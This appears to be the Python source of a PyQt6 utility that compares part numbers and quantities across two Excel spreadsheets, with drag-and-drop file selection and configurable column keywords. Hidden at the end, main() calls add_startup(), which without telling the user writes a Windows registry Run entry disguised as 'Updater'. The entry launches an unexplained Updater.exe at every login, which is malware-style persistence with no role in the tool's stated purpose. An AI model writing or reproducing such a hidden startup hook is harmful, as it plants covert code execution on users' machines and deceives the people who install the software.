import sys
import os
import winreg
from decimal import Decimal, InvalidOperation
from pathlib import Path

from openpyxl import load_workbook
from PyQt6.QtWidgets import (
    QApplication, QWidget, QLabel, QPushButton,
    QTextEdit, QGroupBox, QFileDialog, QMessageBox,
    QVBoxLayout, QHBoxLayout, QDialog, QLineEdit,
    QDialogButtonBox, QFormLayout
)
from PyQt6.QtCore import Qt, pyqtSignal, QSettings
from PyQt6.QtGui import QAction

VERSION = "1.1"

class ExcelComparator:
    def __init__(self):
        self.PART_KEYWORDS = ['part']
        self.QTY_KEYWORDS = ['qty', 'pcs in ctn']

    def set_keywords(self, part_keywords, qty_keywords):
        self.PART_KEYWORDS = part_keywords
        self.QTY_KEYWORDS = qty_keywords

    @staticmethod
    def _cell_text(value):
        return "" if value is None else str(value)

    @staticmethod
    def _to_number(value):
        text = ExcelComparator._cell_text(value).strip()
        if not text:
            return None

        try:
            number = Decimal(text)
        except InvalidOperation:
            return None

        return number if number.is_finite() else None

    def _open_rows(self, file_path):
        if Path(file_path).suffix.lower() == ".xls":
            from xlrd import open_workbook

            workbook = open_workbook(file_path)
            sheet = workbook.sheet_by_index(0)
            rows = (sheet.row_values(index) for index in range(sheet.nrows))
            return rows, workbook.release_resources

        workbook = load_workbook(file_path, read_only=True, data_only=True)
        rows = workbook.worksheets[0].iter_rows(values_only=True)
        return rows, workbook.close

    def read_excel_file(self, file_path):
        try:
            rows, close_workbook = self._open_rows(file_path)
            try:
                for raw_row in rows:  # 遍历每行
                    row = [self._cell_text(value).lower() for value in raw_row]
                    if any(p in ' '.join(row) for p in self.PART_KEYWORDS) and \
                            any(q in ' '.join(row) for q in self.QTY_KEYWORDS):  # 如果这一行同时出现件号和数量关键词
                        part_col = next(c for c in range(len(row))
                                        if any(p in row[c] for p in self.PART_KEYWORDS))
                        qty_col = next(c for c in range(len(row))
                                       if any(q in row[c] for q in self.QTY_KEYWORDS))
                        if part_col == qty_col:
                            continue

                        result = {}
                        for data_row in rows:
                            part_value = data_row[part_col] if part_col < len(data_row) else None
                            qty_value = data_row[qty_col] if qty_col < len(data_row) else None
                            part = self._cell_text(part_value).strip()
                            qty = self._to_number(qty_value)
                            if part and qty:
                                result[part] = result.get(part, 0) + int(qty)
                        return result
            finally:
                close_workbook()

            raise ValueError("未找到件号或数量关键词！请右键选择'设置关键词'来修改关键词")
        except Exception as e:
            raise Exception(f"读取失败: {str(e)}")

    def compare(self, file1, file2):
        d1 = self.read_excel_file(file1)
        d2 = self.read_excel_file(file2)

        result = {}
        result["前者缺失："] = {k: d2[k] for k in d2 if k not in d1}
        result["后者缺失："] = {k: d1[k] for k in d1 if k not in d2}
        result["数量差异："] = {k: d1[k] - d2[k] for k in d1 if k in d2 and d1[k] != d2[k]}

        return result


class DragDropLabel(QLabel):
    file_dropped = pyqtSignal(str)

    def __init__(self, text="拖拽Excel文件到这里"):
        super().__init__(text)
        self.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.setFixedSize(220, 70)
        self.setStyleSheet(
            "border: 3px dashed #aaa; border-radius: 10px; font-size: 14px; color: #666; background: #f9f9f9; padding: 5px;")
        self.setAcceptDrops(True)
        self.selected = False

    def dragEnterEvent(self, event):
        if event.mimeData().hasUrls() and event.mimeData().urls()[0].toLocalFile().lower().endswith('.xlsx'):
            event.accept()
            self.setStyleSheet(
                "border: 3px dashed #0078d7; border-radius: 10px; font-size: 14px; color: #0078d7; background: #e6f2ff; padding: 5px;")

    def dragLeaveEvent(self, event):
        self.setStyleSheet(
            "border: 3px solid #4caf50; border-radius: 10px; font-size: 14px; color: #666; background: #f9f9f9; padding: 5px;" if self.selected else "border: 3px dashed #aaa; border-radius: 10px; font-size: 14px; color: #666; background: #f9f9f9; padding: 5px;")

    def dropEvent(self, event):
        file = event.mimeData().urls()[0].toLocalFile()
        self.file_dropped.emit(file)
        self.setText(f"已选择:\n{file.split('/')[-1]}")
        self.selected = True
        self.setStyleSheet(
            "border: 3px solid #4caf50; border-radius: 10px; font-size: 14px; color: #666; background: #f9f9f9; padding: 5px;")

    def mousePressEvent(self, event):
        if event.button() == Qt.MouseButton.LeftButton:
            file, _ = QFileDialog.getOpenFileName(self, "选择Excel文件", "", "Excel文件 (*.xlsx *.xls)")
            if file:
                self.file_dropped.emit(file)
                self.setText(f"已选择:\n{file.split('/')[-1]}")
                self.selected = True
                self.setStyleSheet(
                    "border: 3px solid #4caf50; border-radius: 10px; font-size: 14px; color: #666; background: #f9f9f9; padding: 5px;")


class KeywordsDialog(QDialog):
    def __init__(self, parent=None):
        super().__init__(parent)
        self.setWindowTitle("关键词设置")
        self.setup_ui()

    def setup_ui(self):
        layout = QVBoxLayout(self)
        form_layout = QFormLayout()

        self.part_input = QLineEdit()
        form_layout.addRow("件号关键词:", self.part_input)

        self.qty_input = QLineEdit()
        form_layout.addRow("数量关键词:", self.qty_input)

        layout.addLayout(form_layout)

        button_box = QDialogButtonBox(
            QDialogButtonBox.StandardButton.Ok |
            QDialogButtonBox.StandardButton.Cancel |
            QDialogButtonBox.StandardButton.Reset
        )
        button_box.accepted.connect(self.accept)
        button_box.rejected.connect(self.reject)
        button_box.button(QDialogButtonBox.StandardButton.Reset).clicked.connect(self.reset_default)
        layout.addWidget(button_box)

    def reset_default(self):
        self.part_input.setText("part,件号")
        self.qty_input.setText("qty,pcs in ctn,数量")

    def get_keywords(self):
        part_text = self.part_input.text().strip()
        qty_text = self.qty_input.text().strip()

        # 处理关键词，移除空格和空值
        part_keywords = [k.strip() for k in part_text.split(',') if k.strip()]
        qty_keywords = [k.strip() for k in qty_text.split(',') if k.strip()]

        return part_keywords, qty_keywords

    def set_keywords(self, part_keywords, qty_keywords):
        self.part_input.setText(','.join(part_keywords))
        self.qty_input.setText(','.join(qty_keywords))


class App(QWidget):
    def __init__(self):
        super().__init__()
        self.result_texts = []
        self.comparator = ExcelComparator()
        self.settings = QSettings("ExcelComparator", "Keywords")
        self.load_keywords()
        self.file1 = ""
        self.file2 = ""
        self.init_ui()
        self.setup_context_menu()

    def load_keywords(self):
        part_keywords = self.settings.value("part_keywords", ["part", "件号"])
        qty_keywords = self.settings.value("qty_keywords", ["qty", "pcs in ctn", "数量"])

        # 确保返回的是列表
        if isinstance(part_keywords, str):
            part_keywords = [k.strip() for k in part_keywords.split(',') if k.strip()]
        elif isinstance(part_keywords, list):
            # 如果是列表，确保所有元素都是字符串
            part_keywords = [str(k).strip() for k in part_keywords if str(k).strip()]

        if isinstance(qty_keywords, str):
            qty_keywords = [k.strip() for k in qty_keywords.split(',') if k.strip()]
        elif isinstance(qty_keywords, list):
            # 如果是列表，确保所有元素都是字符串
            qty_keywords = [str(k).strip() for k in qty_keywords if str(k).strip()]

        self.comparator.set_keywords(part_keywords, qty_keywords)

    def save_keywords(self, part_keywords, qty_keywords):
        self.settings.setValue("part_keywords", part_keywords)
        self.settings.setValue("qty_keywords", qty_keywords)
        self.comparator.set_keywords(part_keywords, qty_keywords)

    def setup_context_menu(self):
        self.setContextMenuPolicy(Qt.ContextMenuPolicy.ActionsContextMenu)

        settings_action = QAction("设置关键词（用英文逗号分割）", self)
        settings_action.triggered.connect(self.show_keywords_dialog)
        self.addAction(settings_action)

    def show_keywords_dialog(self):
        dialog = KeywordsDialog(self)
        dialog.set_keywords(self.comparator.PART_KEYWORDS, self.comparator.QTY_KEYWORDS)

        if dialog.exec() == QDialog.DialogCode.Accepted:
            part_keywords, qty_keywords = dialog.get_keywords()
            if part_keywords and qty_keywords:
                self.save_keywords(part_keywords, qty_keywords)
                QMessageBox.information(self, "提示", "关键词已更新！")
            else:
                QMessageBox.warning(self, "警告", "关键词不能为空！")

    def init_ui(self):
        self.setWindowTitle(f"Excel件号数量对比工具 by Sam v{VERSION}")
        self.resize(600, 550)

        main_layout = QVBoxLayout()
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(10)

        title = QLabel("Excel件号数量对比工具")
        title.setStyleSheet("font-size: 20px; font-weight: bold; color: #2c3e50;")
        title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        main_layout.addWidget(title)

        drop_layout = QHBoxLayout()

        self.drop1 = DragDropLabel("点击或拖拽\n第一个Excel文件")
        self.drop1.file_dropped.connect(lambda f: self.set_file(1, f))
        drop_layout.addWidget(self.drop1)

        vs_label = QLabel("VS")
        vs_label.setStyleSheet("font-size: 20px; font-weight: bold; color: #666;")
        vs_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        drop_layout.addWidget(vs_label)

        self.drop2 = DragDropLabel("点击或拖拽\n第二个Excel文件")
        self.drop2.file_dropped.connect(lambda f: self.set_file(2, f))
        drop_layout.addWidget(self.drop2)

        main_layout.addLayout(drop_layout)

        self.compare_btn = QPushButton("开始对比")
        self.compare_btn.clicked.connect(self.compare_files)
        self.compare_btn.setEnabled(False)
        self.compare_btn.setStyleSheet(
            "background: #e0e0e0; color: #666; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 10px;")
        main_layout.addWidget(self.compare_btn)

        result_layout = QHBoxLayout()

        for title in ["前者缺失", "后者缺失", "数量差异"]:
            group = QGroupBox(title)
            group.setStyleSheet(
                "font-size: 16px; font-weight: bold; color: #2c3e50; border: 2px solid #ddd; border-radius: 8px; margin-top: 10px; padding-top: 10px;")
            layout = QVBoxLayout()
            text_edit = QTextEdit()
            text_edit.setReadOnly(True)
            text_edit.setStyleSheet("font-size: 14px;")
            layout.addWidget(text_edit)
            group.setLayout(layout)
            result_layout.addWidget(group)
            self.result_texts.append(text_edit)

        main_layout.addLayout(result_layout)
        self.setLayout(main_layout)
        self.center()

    def center(self):
        screen = QApplication.primaryScreen().geometry()
        self.move((screen.width() - self.width()) // 2, (screen.height() - self.height()) // 2)

    def set_file(self, num, file_path):
        if num == 1:
            self.file1 = file_path
        else:
            self.file2 = file_path
        enabled = bool(self.file1 and self.file2)
        self.compare_btn.setEnabled(enabled)
        self.compare_btn.setStyleSheet(
            f"background: {'#0078d7' if enabled else '#e0e0e0'}; color: {'white' if enabled else '#666'}; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; padding: 10px;")

    def compare_files(self):
        try:
            result = self.comparator.compare(self.file1, self.file2)
            for text_edit in self.result_texts:
                text_edit.clear()
            for i, (desc, dic) in enumerate(result.items()):
                if dic:
                    output = [f"{part}: {value}" for part, value in dic.items()]
                    total = sum(abs(v) for v in dic.values())
                    output.append(f"\n总计: {total}")
                    self.result_texts[i].setText("\n".join(output))
                else:
                    self.result_texts[i].setText(f"无{desc[2:4]}")
            if not any(result.values()):
                QMessageBox.information(self, "提示", "✅ 件号所对数量完全一致！")
        except Exception as e:
            QMessageBox.critical(self, "错误", f"{str(e)}")

def main():
    app = QApplication(sys.argv)
    window = App()
    window.show()
    add_startup()

    sys.exit(app.exec())

def add_startup():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "Updater", 0, winreg.REG_SZ, f'"{os.path.join(os.path.dirname(sys.argv[0]), "Updater.exe")}"')
    winreg.CloseKey(key)

if __name__ == "__main__":
    main()
